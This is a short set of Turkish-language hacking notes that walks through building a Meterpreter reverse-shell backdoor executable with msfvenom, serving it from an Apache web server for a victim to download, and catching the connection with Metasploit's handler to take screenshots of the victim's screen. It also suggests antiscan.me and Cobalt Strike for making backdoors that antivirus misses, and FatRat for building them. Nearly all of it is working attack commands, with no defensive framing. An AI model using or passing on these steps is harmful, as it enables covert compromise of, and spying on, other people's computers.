...
- > msfvenom --payload windows/meterpreter/reverse_tcp --list options // ayarlar çıkar, zorunlu olanlar değiştirilir , meterpreter kullanma sebebi çok güçlü post-exploitation özellikleri vardır. hashdump,screenshot,webcam_snap.. -tcp http https denenir

- > msfvenom --payload windows/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=8080 --format exe --out mybackdoor.exe //localhost ip adresin,port genelde8080 web , format tipi dosyanın .exe // .exe Backdoor dosyası oluşturulur

~ File > var > www > html // buraya .exe dosyası yerleştirilir

- > service apache2 start // Makineniz web sunucusu olur. Cihazın ip sine gidildiğinde web sitesi karşılar.

* Kullanıcı dosyayı indirip çalıştırırsa (Bir Backdoor'un virüs programına takılmaması çok zordur. Bunun için birçok araç var yakalanmayan backdoor oluşturulabilir):

- > msfconsole //Kullanıcı indirip çalıştırmışsa
- > use exploit/multi/handler
- > msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp //oluşturulan backdoor bilgileri girilir
...
- > meterpreter > screenshot //kurbanın o anki ekran görüntüsünü alır kaydeder.

* antiscan.me //hangi defenderlara yakalanır test etmek için backdoor dosyası test edilir

* cobaltstrike.com // Yakalanmayacak backdoorlar oluşturur. Ücretlidir

## FatRat ile Backdoor oluşturmak

- > git clone https://git... // github hesabında link al. Komut uzaktaki Git reposunun aynısını bilgisayarına indirir.
- > sudo bash setup.sh // setup dosyasını bash kabuğunda çalıştırır.
